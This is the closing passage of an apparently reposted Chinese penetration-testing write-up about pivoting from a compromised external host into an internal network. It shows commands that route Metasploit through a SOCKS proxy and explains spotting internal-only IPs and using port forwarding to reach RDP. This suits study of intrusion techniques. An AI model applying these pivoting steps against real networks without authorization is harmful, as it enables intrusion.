Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">proxychains msfconsole</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">或者在 set payload 之后，执行：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">set proxies socks5:192.168.0.1:1080</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">.<span style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:17px;line-height:37px;;text-align: justify;">拿到一个 shell 之后分辨是否是内/外网 IP</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如下图的情况就说明他只有内网 IP，没有公网 IP，也就是这个机子是用网线接在路由器/交换机上的。我们能访问到他的 80 端口的服务是因为在交换机/路由器上做了端口映射。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.7843803056027164" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/12_e3NhhMiccKM6rUKIFUPN60J6m6xCNg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAlOJr3mIWRNcqG5LNnypb4USnye3NhhMiccKM6rUKIFUPN60J6m6xCNg/640?wx_fmt=png'" data-type="png" data-w="589" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在网络映射中是这样表示的：</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.8514456630109671" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/13_abupMTiaT3EMic1WSk1ZTHyOJMibeQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAXDkAI2FicHhLbOzDzC1PS8mzuNzicabupMTiaT3EMic1WSk1ZTHyOJMibeQ/640?wx_fmt=png'" data-type="png" data-w="1003" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">所以这时候你一般就没有办法直接连接到他的 3389 端口，因为他在内网里所以就只能使用端口转发了。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如果存在外网 IP 的话显示的就是外网 IP。有时候也会遇到既有公网 IP 也有内网 IP 的情况下。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">总结</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里只是总结一下在这期间学到的东西，主要还是要搞进内网得分才高，所以渗透的目标还是要盯着内网，总的来说自己还是太菜了，需要继续努力。</p><p><img data-type="png" class="" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/14_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="color: rgb(36, 41, 46);letter-spacing: 0.544px;text-align: start;white-space: normal;width: 640px !important;visibility: visible !important;"  /></p><p style="text-align: right;"><span style="font-size:10px;line-height:30px;;color: rgb(136, 136, 136);">作者：H4lo</span></p><p style="text-align: right;"><span style="font-size:10px;line-height:30px;;color: rgb(136, 136, 136);">来源：先知社区</span></p><p style="text-align: right;"><span style="font-size:10px;line-height:30px;;color: rgb(136, 136, 136);">如有侵权，请联系删除</span></p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/15_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>